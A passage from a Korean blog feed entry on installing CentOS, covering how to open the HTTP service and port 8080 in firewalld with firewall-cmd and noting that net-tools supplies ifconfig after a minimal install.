id="방화벽으로-인한-문제"><a href="#방화벽으로-인한-문제" class="headerlink" title="방화벽으로 인한 문제"></a>방화벽으로 인한 문제</h3><p>CentOS를 설치하면 기본적으로 방화벽 소프트웨어가 실행되고 있다.</p><p>이로 인하여 사용자 설정으로 개방한 포트에 대하여 외부 접근이 불가능할 수 있다.</p><p>이 때는 다음과 같이 방화벽에 원하는 서비스나 포트를 등록하여 문제를 해결할 수 있다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo firewall-cmd --permanent --add-service=http</span><br><span class="line">sudo firewall-cmd --permanent --add-port=8080/tcp</span><br><span class="line">sudo firewall-cmd --reload</span><br><span class="line">sudo firewall-cmd --permanent --list-all</span><br></pre></td></tr></table></figure><h3 id="기본-소프트웨어-설치"><a href="#기본-소프트웨어-설치" class="headerlink" title="기본 소프트웨어 설치"></a>기본 소프트웨어 설치</h3><p>CentOS를 최소 설치를 선택하여 설치하면 설치 속도는 빨라지지만 시스템 관리 및 서비스 구동에 필요한 기본적인 소프트웨어도 설치되어 있지 않은 상태가 된다.</p><p>다음 목록을 참고하여 기본 소프트웨어 설치를 위한 패키지를 설치할 수 있다.</p><ul><li>ifconfig<ul><li>net-tools</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/2019/08/02/install-centos/centos-logo.png&quot; width=&quot;200&quot;&gt;

&lt;p&gt;운영체제 CentOS를 설치하는 방법을 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="시스템 구축" scheme="https://www.jslee.me/categories/%EC%8B%9C%EC%8A%A4%ED%85%9C-%EA%B5%AC%EC%B6%95/"/>
    
    
      <category term="CentOS" scheme="https://www.jslee.me/tags/CentOS/"/>
    
  </entry>
  
</feed>
